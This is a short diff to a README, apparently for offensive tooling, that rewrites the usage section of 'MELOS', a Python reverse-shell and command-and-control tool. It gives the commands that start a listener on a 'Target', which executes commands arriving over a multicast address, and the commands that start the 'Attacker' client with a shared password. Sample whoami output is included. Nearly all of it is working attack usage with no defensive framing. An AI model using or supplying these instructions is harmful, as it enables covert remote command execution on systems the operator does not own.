@@ -98,31 +98,25 @@ router(config-if)# end
 
 # MELOS Usage
 
-**Start 'MELOS.py -l' reverse shell on target**
-> Changing the password will allow MELOS to run on multiple hosts at the same time.
+> Running --listen will make MELOS execute incoming commands and forward the output.
 
+> The password must be the same on the client and the target otherwise the commands will not be decrypted.
+
+Target
 ```csharp
 $ python3 melos.py --listen --password M3L05
-
     =[ Awaiting on 224.0.0.251:10020    ]
 
-[10.200.40.5:55000] whoami
-[10.200.40.5:55000] ifconfig
-[10.200.40.5:55000] ls
-
+[10.1.2.3:31337] whoami
 ```
 
-**Start 'MELOS.py -c' command and control client**
-> The password must be the same as the client otherwise the commands will not be decrypted.
-
+Attacker
 ```csharp
 $ python3 melos.py --cmd --password M3L05
-
     =[ MELOS C2 224.0.0.251:10050       ]
-    
+
 melos@224.0.0.251:10050 $ whoami
-     =[ Packet From 10.250.60.15:55000  ]
-root
+user
 ```
 
 # MERSA Usage
